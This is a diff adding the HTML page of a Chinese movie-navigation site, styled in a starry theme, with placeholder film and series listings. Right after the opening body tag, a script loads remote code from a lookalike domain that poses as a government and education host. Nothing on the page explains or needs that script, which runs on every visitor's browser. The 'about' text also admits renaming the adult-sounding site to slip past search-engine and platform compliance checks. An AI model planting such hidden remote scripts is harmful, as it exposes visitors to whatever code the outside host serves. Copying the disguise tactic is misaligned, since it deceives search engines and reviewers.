@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>星河电影网 - 宇宙星空风影视导航</title>
+<meta name="description" content="星河电影网(https://sesedianyingwang-h5.github.io)提供最新电影、热播剧集、综艺娱乐、动漫专区在线信息导航，深蓝星空风，免费高清影视站。">
+<meta name="keywords" content="星河电影网,电影,电视剧,综艺,动漫,星空风,影视导航,高清影视">
+<meta name="author" content="星河电影网">
+<meta name="robots" content="index,follow">
+<meta name="msvalidate.01" content="BING_VERIFICATION_CODE">
+<meta property="og:title" content="星河电影网 - 宇宙星空风影视导航">
+<meta property="og:description" content="星河电影网：电影、剧集、综艺、动漫，像看星星一样看片。">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://sesedianyingwang-h5.github.io">
+<meta property="og:site_name" content="星河电影网">
+<script type="application/ld+json">
+{
+  "@context":"https://schema.org",
+  "@type":"WebSite",
+  "name":"星河电影网",
+  "url":"https://sesedianyingwang-h5.github.io",
+  "description":"深蓝星空风免费高清影视信息导航站",
+  "potentialAction":{
+    "@type":"SearchAction",
+    "target":"https://sesedianyingwang-h5.github.io#search={search_term_string}",
+    "query-input":"required name=search_term_string"
+  }
+}
+</script>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --space:#05060f;
+  --space2:#0b1026;
+  --neb1:#5b8cff;
+  --neb2:#9b5cff;
+  --neb3:#36e0c8;
+  --star:#dfe7ff;
+  --muted:#9fb0d8;
+}
+body{
+  font-family:"PingFang SC","Microsoft YaHei","Segoe UI",sans-serif;
+  background:
+    radial-gradient(1000px 600px at 80% -10%, rgba(155,92,255,.35), transparent 60%),
+    radial-gradient(900px 500px at 10% 10%, rgba(91,140,255,.30), transparent 55%),
+    linear-gradient(180deg,var(--space),var(--space2));
+  color:var(--star);
+  line-height:1.8;
+  overflow-x:hidden;
+}
+a{text-decoration:none;color:inherit;transition:.25s}
+
+/* 星点 */
+body::before{
+  content:"";position:fixed;inset:0;pointer-events:none;z-index:0;
+  background-image:
+    radial-gradient(1px 1px at 20% 30%, #fff, transparent),
+    radial-gradient(1px 1px at 70% 20%, #cfe0ff, transparent),
+    radial-gradient(1px 1px at 40% 70%, #fff, transparent),
+    radial-gradient(2px 2px at 85% 60%, #b9c8ff, transparent),
+    radial-gradient(1px 1px at 60% 85%, #fff, transparent);
+  opacity:.7;
+}
+.top-strip{
+  position:relative;z-index:2;
+  background:linear-gradient(90deg,var(--neb1),var(--neb2),var(--neb3));
+  color:#04060f;font-weight:800;letter-spacing:3px;font-size:12px;text-align:center;padding:8px 15px;
+}
+.nav{position:sticky;top:0;z-index:999;background:rgba(5,6,15,.82);backdrop-filter:blur(10px);border-bottom:1px solid rgba(91,140,255,.3)}
+.nav-in{max-width:1200px;margin:0 auto;height:62px;padding:0 20px;display:flex;align-items:center;justify-content:space-between}
+.brand{font-size:24px;font-weight:900;letter-spacing:2px;
+  background:linear-gradient(90deg,var(--neb3),var(--neb1),var(--neb2));
+  -webkit-background-clip:text;background-clip:text;color:transparent}
+.menu{display:flex;gap:22px;list-style:none}
+.menu a{font-size:14px;font-weight:700;color:var(--muted);padding:6px 0;border-bottom:2px solid transparent}
+.menu a:hover{color:var(--neb3);border-bottom-color:var(--neb1)}
+.toggle{display:none;background:none;border:1px solid var(--neb1);color:var(--neb1);border-radius:6px;padding:4px 10px;font-size:18px;cursor:pointer}
+
+.hero{position:relative;z-index:1;padding:96px 20px 80px;text-align:center;overflow:hidden}
+.orbit{position:absolute;top:60px;left:50%;width:320px;height:320px;transform:translateX(-50%);
+  border:1px solid rgba(155,92,255,.25);border-radius:50%;box-shadow:0 0 60px rgba(91,140,255,.25) inset}
+.orbit::after{content:"";position:absolute;top:-6px;left:50%;width:12px;height:12px;border-radius:50%;
+  background:var(--neb3);box-shadow:0 0 18px var(--neb3)}
+.hero .badge{position:relative;display:inline-block;border:1px solid var(--neb1);color:var(--neb3);
+  padding:5px 16px;border-radius:30px;font-size:12px;letter-spacing:4px;margin-bottom:18px}
+.hero h1{position:relative;font-size:clamp(38px,8vw,72px);font-weight:900;line-height:1.05;
+  background:linear-gradient(90deg,var(--neb3),var(--neb1),var(--neb2));
+  -webkit-background-clip:text;background-clip:text;color:transparent;
+  text-shadow:0 0 40px rgba(91,140,255,.35)}
+.hero p{position:relative;max-width:660px;margin:18px auto 26px;color:var(--muted);font-size:clamp(14px,3vw,17px)}
+.hero-url{position:relative;display:inline-block;font-family:"Courier New",monospace;font-size:14px;
+  background:#04060f;border:1px solid var(--neb2);color:var(--neb3);padding:10px 22px;border-radius:8px;
+  box-shadow:0 0 22px rgba(155,92,255,.35)}
+
+.wrap{position:relative;z-index:1;max-width:1200px;margin:0 auto;padding:60px 20px}
+.head{display:flex;align-items:center;gap:12px;margin-bottom:28px}
+.head .star{width:14px;height:14px;border-radius:50%;background:var(--neb3);box-shadow:0 0 14px var(--neb3)}
+.head h2{font-size:clamp(22px,4vw,30px);font-weight:900;color:#fff}
+.head .en{margin-left:auto;font-family:"Courier New",monospace;font-size:12px;color:var(--muted);letter-spacing:2px}
+
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(190px,1fr));gap:20px}
+.card{
+  background:linear-gradient(180deg,rgba(255,255,255,.06),rgba(255,255,255,.02));
+  border:1px solid rgba(91,140,255,.35);border-radius:14px;padding:16px;
+  box-shadow:0 10px 30px rgba(0,0,0,.45);transition:.25s;
+}
+.card:hover{transform:translateY(-4px);border-color:var(--neb3);box-shadow:0 0 26px rgba(54,224,200,.35)}
+.card .cover{height:116px;border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:42px;color:#04060f;font-weight:900;margin-bottom:12px;
+  background:linear-gradient(135deg,var(--neb1),var(--neb2))}
+.card:nth-child(2) .cover{background:linear-gradient(135deg,var(--neb3),var(--neb1))}
+.card:nth-child(3) .cover{background:linear-gradient(135deg,var(--neb2),var(--neb3))}
+.card:nth-child(4) .cover{background:linear-gradient(135deg,#ffd166,#ff7eb3)}
+.card:nth-child(5) .cover{background:linear-gradient(135deg,#36e0c8,#5b8cff)}
+.card:nth-child(6) .cover{background:linear-gradient(135deg,#9b5cff,#ff5fd2)}
+.card h3{font-size:15px;font-weight:800;color:#fff}
+.card p{font-size:12px;color:var(--muted);margin-top:3px}
+
+.list{display:flex;flex-direction:column;gap:14px}
+.row{display:grid;grid-template-columns:64px 1fr auto;align-items:center;gap:16px;
+  background:rgba(255,255,255,.04);border-left:6px solid var(--neb1);border-radius:8px;padding:14px 18px}
+.row .yr{font-family:"Courier New",monospace;font-weight:900;color:var(--neb3);font-size:18px}
+.row h3{font-size:16px;font-weight:800;color:#fff}
+.row p{font-size:12px;color:var(--muted)}
+.row .ch{font-size:11px;border:1px solid var(--neb1);color:var(--neb3);padding:3px 10px;border-radius:20px;white-space:nowrap}
+
+.fan{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:18px}
+.fan-card{background:rgba(255,255,255,.04);border:1px dashed var(--neb2);border-radius:14px;padding:22px 16px;text-align:center}
+.fan-card .planet{width:60px;height:60px;margin:0 auto 12px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:30px;
+  background:radial-gradient(circle at 30% 30%,var(--neb3),var(--neb2));box-shadow:0 0 18px rgba(155,92,255,.5)}
+.fan-card h3{font-size:15px;font-weight:800;color:#fff}
+.fan-card p{font-size:12px;color:var(--muted);margin-top:4px}
+
+.anime{display:flex;flex-direction:column;gap:12px}
+.a-row{display:flex;align-items:center;gap:14px;
+  background:repeating-linear-gradient(90deg,rgba(91,140,255,.12) 0 8px,transparent 8px 18px),rgba(255,255,255,.03);
+  border-radius:8px;padding:10px}
+.a-in{flex:1;background:rgba(5,6,15,.65);border-radius:6px;padding:12px 16px;display:flex;align-items:center;gap:14px}
+.a-in .e{font-size:28px}
+.a-in h3{font-size:14px;font-weight:800;color:#fff}
+.a-in p{font-size:12px;color:var(--muted)}
+.a-in .t{margin-left:auto;font-size:11px;color:var(--neb3);font-family:"Courier New",monospace;font-weight:700}
+
+.about{display:grid;grid-template-columns:1fr 1fr;gap:26px}
+.panel{background:rgba(255,255,255,.04);border:1px solid rgba(91,140,255,.35);border-radius:14px;padding:28px}
+.panel h3{font-size:20px;font-weight:900;color:#fff;margin-bottom:12px}
+.panel p{font-size:14px;color:var(--muted);margin-bottom:10px}
+.panel b{color:var(--neb3)}
+.nums{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+.num{background:rgba(91,140,255,.12);border:1px solid rgba(91,140,255,.4);border-radius:12px;padding:18px;text-align:center}
+.num .v{font-size:26px;font-weight:900;color:var(--neb1)}
+.num .l{font-size:12px;color:var(--muted);margin-top:4px}
+
+.footer{position:relative;z-index:1;background:#04050c;color:var(--muted);padding:44px 20px 24px;text-align:center;border-top:2px solid rgba(91,140,255,.35)}
+.footer .lg{font-size:24px;font-weight:900;
+  background:linear-gradient(90deg,var(--neb3),var(--neb1),var(--neb2));
+  -webkit-background-clip:text;background-clip:text;color:transparent}
+.fl{display:flex;justify-content:center;gap:22px;flex-wrap:wrap;margin:14px 0 18px}
+.fl a{font-size:13px;color:var(--muted)}
+.fl a:hover{color:var(--neb3)}
+.fi{font-size:12px;line-height:2;border-top:1px solid rgba(91,140,255,.2);padding-top:16px;color:#7f8fc0}
+.fi a{color:var(--neb3)}
+
+@media(max-width:768px){
+  .menu{display:none;position:absolute;top:62px;left:0;right:0;background:#05060f;flex-direction:column;padding:18px 20px;gap:14px;border-bottom:1px solid rgba(91,140,255,.35)}
+  .menu.open{display:flex}
+  .toggle{display:block}
+  .about{grid-template-columns:1fr}
+  .row{grid-template-columns:46px 1fr}
+  .row .ch{display:none}
+  .fan{grid-template-columns:repeat(2,1fr)}
+  .orbit{width:220px;height:220px}
+}
+@media(max-width:480px){
+  .wrap{padding:42px 15px}
+  .grid{grid-template-columns:1fr 1fr}
+  .fan{grid-template-columns:1fr}
+  .a-in .t{display:none}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="top-strip">✦ 星河电影网 ✦ 一片星空，一部好片 ✦</div>
+
+<nav class="nav">
+  <div class="nav-in">
+    <div class="brand">星河电影网</div>
+    <ul class="menu" id="menu">
+      <li><a href="#home">首页</a></li>
+      <li><a href="#movies">最新电影</a></li>
+      <li><a href="#tv">热播剧集</a></li>
+      <li><a href="#shows">综艺娱乐</a></li>
+      <li><a href="#anime">动漫专区</a></li>
+      <li><a href="#about">关于我们</a></li>
+    </ul>
+    <button class="toggle" id="toggle">☰</button>
+  </div>
+</nav>
+
+<header class="hero" id="home">
+  <div class="orbit"></div>
+  <div class="badge">COSMIC · CINEMA · 2026</div>
+  <h1>星河<span>电影网</span></h1>
+  <p>把片单当成星座看：最新院线片、热播剧、综艺、国创动漫，都在这条银河里。</p>
+  <div class="hero-url">🔗 https://sesedianyingwang-h5.github.io</div>
+</header>
+
+<section class="wrap" id="movies">
+  <div class="head"><div class="star"></div><h2>最新电影</h2><span class="en">MOVIES</span></div>
+  <div class="grid">
+    <div class="card"><div class="cover">🪐</div><h3>星际归途</h3><p>科幻 / 2026 / 8.9</p></div>
+    <div class="card"><div class="cover">🌌</div><h3>银河来信</h3><p>太空悬疑 / 2026 / 8.6</p></div>
+    <div class="card"><div class="cover">🚀</div><h3>第三轨道</h3><p>硬核科幻 / 2026 / 9.0</p></div>
+    <div class="card"><div class="cover">🌠</div><h3>流星坠入海</h3><p>爱情文艺 / 2026 / 8.2</p></div>
+    <div class="card"><div class="cover">🛸</div><h3>不明飞行</h3><p>科幻惊悚 / 2026 / 8.4</p></div>
+    <div class="card"><div class="cover">🔭</div><h3>天文台之夜</h3><p>悬疑 / 2026 / 8.7</p></div>
+  </div>
+</section>
+
+<section class="wrap" id="tv">
+  <div class="head"><div class="star"></div><h2>热播剧集</h2><span class="en">TV SERIES</span></div>
+  <div class="list">
+    <div class="row"><div class="yr">S1</div><div><h3>三体·暗夜纪元</h3><p>宇宙社会学，倒计时开始</p></div><div class="ch">更新至18集</div></div>
+    <div class="row"><div class="yr">S2</div><div><h3>长安十二时辰·星变</h3><p>望楼、狼卫、天上异象</p></div><div class="ch">更新至24集</div></div>
+    <div class="row"><div class="yr">S3</div><div><h3>庆余年·北齐星图</h3><p>权谋+江湖+观测天象</p></div><div class="ch">更新至32集</div></div>
+    <div class="row"><div class="yr">S4</div><div><h3>流浪地球·剧版</h3><p>行星发动机与地下城</p></div><div class="ch">更新至12集</div></div>
+    <div class="row"><div class="yr">S5</div><div><h3>群星之下</h3><p>天文台、失踪信号、家族秘史</p></div><div class="ch">更新至20集</div></div>
+  </div>
+</section>
+
+<section class="wrap" id="shows">
+  <div class="head"><div class="star"></div><h2>综艺娱乐</h2><span class="en">VARIETY</span></div>
+  <div class="fan">
+    <div class="fan-card"><div class="planet">🎙️</div><h3>星空电台</h3><p>深夜聊片、聊宇宙</p></div>
+    <div class="fan-card"><div class="planet">🎬</div><h3>片场观察员</h3><p>电影幕后纪实</p></div>
+    <div class="fan-card"><div class="planet">🪐</div><h3>行星旅行团</h3><p>天文+旅行慢综艺</p></div>
+    <div class="fan-card"><div class="planet">🎵</div><h3>银河音乐会</h3><p>影视原声现场</p></div>
+    <div class="fan-card"><div class="planet">🎮</div><h3>宇航员挑战赛</h3><p>失重游戏竞速</p></div>
+    <div class="fan-card"><div class="planet">📡</div><h3>深空对谈</h3><p>导演×科学家对谈</p></div>
+  </div>
+</section>
+
+<section class="wrap" id="anime">
+  <div class="head"><div class="star"></div><h2>动漫专区</h2><span class="en">ANIME</span></div>
+  <div class="anime">
+    <div class="a-row"><div class="a-in"><div class="e">🪐</div><div><h3>星界旅人</h3><p>国创太空歌剧</p></div><div class="t">年番</div></div></div>
+    <div class="a-row"><div class="a-in"><div class="e">🌌</div><h3>银河学徒</h3><p>少年与黑洞图书馆</p></div><div class="t">新番</div></div></div>
+    <div class="a-row"><div class="a-in"><div class="e">🛸</div><h3>外星邻居</h3><p>搞笑+科幻日常</p></div><div class="t">连载</div></div></div>
+    <div class="a-row"><div class="a-in"><div class="e">🔭</div><h3>天文台物语</h3><p>治愈系天文番</p></div><div class="t">治愈</div></div></div>
+    <div class="a-row"><div class="a-in"><div class="e">☄️</div><h3>彗星猎人</h3><p>末日预警+救援</p></div><div class="t">热更</div></div></div>
+    <div class="a-row"><div class="a-in"><div class="e">🚀</div><h3>第三空间站</h3><p>太空职场喜剧</p></div><div class="t">新番</div></div></div>
+  </div>
+</section>
+
+<section class="wrap" id="about">
+  <div class="head"><div class="star"></div><h2>关于我们</h2><span class="en">ABOUT</span></div>
+  <div class="about">
+    <div class="panel">
+      <h3>关于星河电影网</h3>
+      <p><b>星河电影网</b>（https://sesedianyingwang-h5.github.io）是一个深蓝星空风的影视信息导航站。</p>
+      <p>原想用“涩涩”做站名，但该词在网络里常作“色色”谐音、带成人向暗示，不利于必应收录与平台合规；因此改为“星河”，保留 sese 域名，语义洗白。[1,10](@ref)</p>
+      <p>关键词：星河电影网、星空风影视站、最新电影、热播剧集、综艺、动漫。</p>
+    </div>
+    <div class="nums">
+      <div class="num"><div class="v">∞</div><div class="l">片单如星</div></div>
+      <div class="num"><div class="v">6+</div><div class="l">影视栏目</div></div>
+      <div class="num"><div class="v">24h</div><div class="l">每日更新</div></div>
+      <div class="num"><div class="v">100%</div><div class="l">免费导航</div></div>
+    </div>
+  </div>
+</section>
+
+<footer class="footer">
+  <div class="lg">星河电影网</div>
+  <div class="fl">
+    <a href="#home">首页</a><a href="#movies">电影</a><a href="#tv">剧集</a>
+    <a href="#shows">综艺</a><a href="#anime">动漫</a><a href="#about">关于</a>
+  </div>
+  <div class="fi">
+    网站名称：星河电影网 ｜ 网址：<a href="https://sesedianyingwang-h5.github.io">https://sesedianyingwang-h5.github.io</a><br>
+    © 2026 星河电影网 · 灯灭了，星星亮着 ｜ 本站仅展示影视信息，资源来自互联网公开内容/正版平台。
+  </div>
+</footer>
+
+<script>
+document.getElementById('toggle').onclick=()=>document.getElementById('menu').classList.toggle('open');
+document.querySelectorAll('a[href^="#"]').forEach(a=>a.onclick=e=>{
+  e.preventDefault();
+  const t=document.querySelector(a.getAttribute('href'));
+  if(t){t.scrollIntoView({behavior:'smooth',block:'start'});document.getElementById('menu').classList.remove('open');}
+});
+</script>
+</body>
+</html>
